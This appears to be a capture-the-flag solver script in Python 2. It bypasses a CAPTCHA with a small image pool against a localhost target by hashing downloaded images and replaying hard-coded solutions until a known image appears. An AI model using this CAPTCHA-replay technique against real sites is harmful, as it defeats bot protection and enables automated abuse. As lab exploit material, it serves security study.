import requests
import md5
import sys
import os.path

BASE_URL = 'http://localhost'
SESS = requests.Session()

def download_images():
	count = 0;
	while count < 10:
		res = SESS.get(BASE_URL + '?image')
		image_hash = md5.new(res.content).hexdigest()
		if os.path.isfile(image_hash + '.png'):
			continue
		else:
			with open(image_hash + '.png', 'w') as fp:
				fp.write(res.content)
			count += 1
'''
There is a limited cache size so to solve this just download some images and store their
hash->solution paid in in solve():known. THe script will then loop over captchas until
it sees one it knows and submit it.
'''
def solve():
	known = {
		'eecf524abe396ebeec0643e32945dd2d':'2:X%K',
		'f9b40774eb23ed1daf4dbdc3a5fea0cd':'n!P)v',
		'c37f8d55a5cba62189b043e344099290':'`YBQK',
		'd7713c3f9fc0feaa05dca06d1820a233':'cH<|F',
	}
	while True:
		res = SESS.get(BASE_URL + '?image')
		image_hash = md5.new(res.content).hexdigest()
		if not image_hash in known:
			print "[*] {} not found.".format(image_hash)
			continue
		else:
			res = SESS.post(BASE_URL, data={'captcha':known[image_hash]})
			print "[!] {} with solution {}".format(image_hash,known[image_hash])
			print res.text
			print res.content
			break


if len(sys.argv) > 1:
	if sys.argv[1] == '--download':
		download_images()
		sys.exit()
solve()
	

